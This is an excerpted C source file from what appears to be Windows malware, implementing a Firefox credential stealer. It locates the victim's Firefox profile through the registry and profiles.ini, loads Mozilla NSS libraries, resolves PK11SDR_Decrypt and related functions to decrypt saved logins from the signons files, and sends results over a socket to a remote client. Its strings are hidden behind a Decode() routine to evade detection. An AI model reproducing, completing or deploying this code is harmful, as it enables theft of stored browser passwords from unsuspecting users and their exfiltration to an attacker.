...
void DumpSignonSecrets(char *profilePath, SOCKET sock);
...
int FIREFOX_FindPasses(SOCKET sock)
{
   ...
   if (profileDir != NULL && firefoxDir != NULL)
   {
	...
	NET_Send(sock, INFO, strings[Decode(s_failed)].encoded);
	return 0;
}
...
//	char partialPath[] = "Application Data\\Mozilla\\Firefox";
	char *partialPath;
	partialPath = strings[Decode(s_firefoxpartialpath)].encoded;
	...
	HMODULE userenv_dll = LoadLibrary(strings[Decode(dll_userenv)].encoded);
	if (userenv_dll)
		fGetUserProfileDirectory = (GUPD)GetProcAddress(userenv_dll, strings[Decode(dll_GetUserProfileDirectoryA)].encoded);
	else
		return NULL;
...
//   strcat(profileFile,"\\profiles.ini");
   strcat(profileFile,strings[Decode(s_firefoxprofilesini)].encoded);
...
//   char regSubKey[]    = "SOFTWARE\\Clients\\StartMenuInternet\\firefox.exe\\shell\\open\\command";
	char *regSubKey;
	regSubKey = strings[Decode(s_firefoxregkey)].encoded;
   char path[_MAX_PATH] ="";
...
int InitializeFirefoxLibrary(char *firefoxPath)
{
   ...
   if( firefoxPath != NULL )
   {
      ...
      if( LoadLibrary2(firefoxPath, strings[Decode(dll_nspr4)].encoded) )
      {
         if((libplc=LoadLibrary2(firefoxPath, strings[Decode(dll_plc4)].encoded)) )
         {
            if( LoadLibrary2(firefoxPath, strings[Decode(dll_plds4)].encoded) )
            {
               if( LoadLibrary2(firefoxPath, strings[Decode(dll_softokn3)].encoded) )
               {
                  libnss=LoadLibrary2(firefoxPath, strings[Decode(dll_nss3)].encoded);
                  //if( libnss )
                  //   ;
...
//      libplc =LOADLIBRARY(PLC_LIBRARY_NAME);
      libplc = LoadLibrary2(firefoxPath, strings[Decode(dll_plc4)].encoded);
   ...
   NSSInit               = (NSS_Init) GETPROCADDRESS(libnss, strings[Decode(dll_NSS_Init)].encoded);
   NSSShutdown            = (NSS_Shutdown)GETPROCADDRESS(libnss, strings[Decode(dll_NSS_Shutdown)].encoded);
   PK11GetInternalKeySlot = (PK11_GetInternalKeySlot) GETPROCADDRESS(libnss, strings[Decode(dll_PK11_GetInternalKeySlot)].encoded);
   PK11FreeSlot           = (PK11_FreeSlot) GETPROCADDRESS(libnss, strings[Decode(dll_PK11_FreeSlot)].encoded);
   PK11Authenticate       = (PK11_Authenticate) GETPROCADDRESS(libnss, strings[Decode(dll_PK11_Authenticate)].encoded);
   PK11SDRDecrypt         = (PK11SDR_Decrypt) GETPROCADDRESS(libnss, strings[Decode(dll_PK11SDR_Decrypt)].encoded);
   PK11CheckUserPassword  = (PK11_CheckUserPassword ) GETPROCADDRESS(libnss, strings[Decode(dll_PK11_CheckUserPassword)].encoded);
   ...
   PLBase64Decode     = ( PL_Base64Decode ) GETPROCADDRESS(libplc, strings[Decode(dll_PL_Base64Decode)].encoded);
...
void SendToClient(SOCKET sock, char *buff)
{
	char	*b;
...
char *signonFileName1;
signonFileName1 = strings[Decode(s_firefoxsignonstxt)].encoded;
char *signonFileName2;
signonFileName2 = strings[Decode(s_firefoxsignons2txt)].encoded;
